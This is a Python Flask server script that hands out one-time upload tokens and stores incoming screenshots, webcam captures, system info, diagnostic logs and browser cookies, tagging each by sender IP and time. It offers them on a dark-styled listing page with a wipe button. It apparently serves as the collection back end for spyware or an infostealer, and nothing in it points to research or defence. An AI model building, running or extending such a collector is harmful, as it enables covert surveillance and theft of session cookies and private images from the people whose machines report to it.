#!/usr/bin/env python3

import secrets
import os
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template_string

app = Flask(__name__)
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

tokens = set()

FILES_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Uploaded Files</title>
<style>
body{font-family:monospace;background:#111;color:#0f0;padding:20px}
a{color:#0f0;text-decoration:none}
a:hover{text-decoration:underline}
table{border-collapse:collapse;width:100%}
td,th{padding:6px 12px;text-align:left;border-bottom:1px solid #333}
.size{text-align:right}
img{max-width:800px;border:1px solid #333;margin:10px 0}
</style></head><body>
<h1>/uploads ({{ total }} files)</h1>
<button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())" style="background:#c00;color:#fff;border:none;padding:8px 16px;font:inherit;cursor:pointer">Clear All Files</button>
<br><br>
<table>
<tr><th>name</th><th class="size">size</th><th>time</th></tr>
{% for f in files %}
<tr>
  <td><a href="/file/{{ f.name }}">{{ f.name }}</a></td>
  <td class="size">{{ f.size }}</td>
  <td>{{ f.mtime }}</td>
</tr>
{% endfor %}
</table>
</body></html>"""

@app.route("/")
def index():
    files = []
    for name in sorted(os.listdir(UPLOAD_DIR)):
        path = os.path.join(UPLOAD_DIR, name)
        if os.path.isfile(path):
            st = os.stat(path)
            sz = st.st_size
            if sz < 1024:            sizestr = f"{sz} B"
            elif sz < 1024*1024:      sizestr = f"{sz/1024:.1f} KB"
            else:                     sizestr = f"{sz/1024/1024:.1f} MB"
            files.append({
                "name": name,
                "size": sizestr,
                "mtime": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
            })
    return render_template_string(FILES_HTML, files=files, total=len(files))

@app.route("/file/<path:name>")
def serve_file(name):
    return send_from_directory(UPLOAD_DIR, name)

@app.route("/clear", methods=["POST"])
def clear():
    import shutil
    for f in os.listdir(UPLOAD_DIR):
        p = os.path.join(UPLOAD_DIR, f)
        if os.path.isfile(p):
            os.remove(p)
    return jsonify({"status": "ok", "cleared": True})

@app.route("/token", methods=["GET"])
def issue_token():
    t = secrets.token_hex(16)
    tokens.add(t)
    return jsonify({"token": t})

@app.route("/upload", methods=["POST"])
def receive():
    t = request.args.get("token", "") or request.form.get("token", "")
    if not t or t not in tokens:
        return jsonify({"error": "bad token"}), 403
    tokens.discard(t)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ip = (request.headers.get("X-Real-IP") or request.remote_addr or "0").replace(":", "_")

    saved = []
    for field in ("screenshot", "webcam", "sysinfo", "diaglog", "cookies"):
        files = request.files.getlist(field) if field == "cookies" else [request.files.get(field)]
        for f in files:
            if f and f.filename:
                ext = os.path.splitext(f.filename)[1] or ".dat"
                name = f"{ts}_{ip}_{field}_{f.filename}"
                try:
                    f.save(os.path.join(UPLOAD_DIR, name))
                    sz = os.path.getsize(os.path.join(UPLOAD_DIR, name))
                    saved.append(f"{name}({sz}B)")
                except Exception as ex:
                    saved.append(f"{name}(ERR:{ex})")

    return jsonify({"status": "ok", "saved": saved})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8890)
